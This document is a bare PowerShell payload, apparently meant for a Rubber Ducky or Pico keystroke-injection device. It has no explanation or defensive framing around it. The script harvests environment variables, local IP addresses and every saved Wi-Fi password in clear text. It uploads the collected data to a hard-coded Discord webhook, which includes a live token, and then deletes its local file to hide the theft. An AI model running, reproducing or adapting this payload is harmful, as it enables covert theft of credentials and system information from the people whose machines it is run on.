$url="https://discord.com/api/webhooks/1148872565029343233/Vlwhulrs4XR2hgqGudUMHApVkimI9a9grXHfaweogpPu80MQetIR2A5fy5pLVBut6tTQ";dir env: >> stats.txt; Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)' >> stats.txt;(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -AutoSize >> stats.txt;$Body=@{ content = "$env:computername Stats from Ducky/Pico"};Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);curl.exe -F "file1=@stats.txt" $url ; Remove-Item '.\stats.txt';exit